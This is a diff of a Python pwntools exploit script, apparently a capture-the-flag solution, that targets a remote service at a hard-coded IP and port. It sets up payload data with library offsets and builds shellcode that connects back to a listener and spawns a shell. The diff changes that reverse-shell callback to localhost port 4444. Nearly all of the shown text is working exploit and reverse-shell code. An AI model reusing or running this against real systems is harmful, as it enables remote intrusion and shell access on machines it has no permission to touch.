@@ -1,10 +1,7 @@
 from pwn import *
 import struct
 
-ip = localhost
-port = 4444
 context.log_level = "error"
-#ip = 'localhost'
 ip = '3.114.63.117'
 port = 48763
 def create_header(addr):
@@ -81,9 +78,11 @@ data[10] = libtalk+0x27e110
 data[11] = 0x3eeb
 
 
+rev_ip = 'localhost'
+rev_port = 4444
 shellcode = asm("""
 add rsp,0x1000
-""") + asm(shellcraft.connect(ip,port))+ asm(shellcraft.dupsh())
+""") + asm(shellcraft.connect(rev_ip,rev_port))+ asm(shellcraft.dupsh())
 
 shellcode += "\x90"*(8-len(shellcode)%8)
 for i in range(0,len(shellcode),8):
